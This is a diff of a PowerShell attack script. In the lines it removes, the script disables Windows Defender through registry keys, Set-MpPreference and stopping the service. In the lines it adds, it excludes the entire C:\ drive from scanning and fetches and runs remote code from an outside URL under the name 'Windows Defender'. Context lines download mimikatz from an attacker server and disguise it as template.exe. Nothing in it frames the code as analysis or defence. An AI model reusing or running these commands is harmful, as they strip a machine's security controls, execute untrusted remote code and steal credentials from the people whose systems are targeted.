@@ -12,13 +12,8 @@ New-Item -ItemType Directory -Path "C:\ProgramData" -Force
 Set-Location "C:\ProgramData"
 
 # Disable Windows Defender
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -MAPSReporting 0 -SubmitSamplesConsent 2
-Remove-WindowsFeature Windows-Defender -ErrorAction SilentlyContinue
-Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "C:\"
+& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "Windows Defender" --silent 
 
 # Download and run mimikatz
 Invoke-WebRequest "$ServerIpPort/mimikatz.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Templates\template.exe"
